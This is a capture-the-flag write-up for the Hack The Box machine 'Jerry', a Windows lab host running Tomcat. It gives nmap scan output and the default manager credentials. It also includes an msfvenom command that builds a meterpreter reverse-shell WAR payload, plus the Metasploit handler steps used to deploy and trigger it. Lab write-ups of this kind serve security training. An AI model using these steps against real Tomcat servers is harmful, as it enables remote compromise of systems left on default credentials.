#	Jerry (10.10.10.95 -Windows box)
##	Writeup by Hexachroma

1. nmap -Pn -sC -sV -oN nmap/init {ip} -T5 -v
```
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/7.0.88
```
2. WebApp misconfiguration
>	Default creds tomcat:s3cret to view manager-gui
>	to exploit create a war file with msfvenom

3. Creating payload with msfvenom 
> 	`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$tun0 LPORT=9001 -f war -o exploit.war`
>	Note: `[1] */meterpreter_reverse_tcp != [2] */meterpreter/reverse_tcp`
>			since [1] is bigger in size than [2]

4. msfconsole -q and upload + deploy war files in jerry.htb:8080/manager/
>	enter `use exploit/multi/handler`
>	enter `set payload windows/x64/meterpreter/reverse_tcp`
>	set LHOST tun0
>	set LPORT xxxx
>	run
>	switch to your browser and query the location ie. jerry.htb:8080/exploit/random.jsp
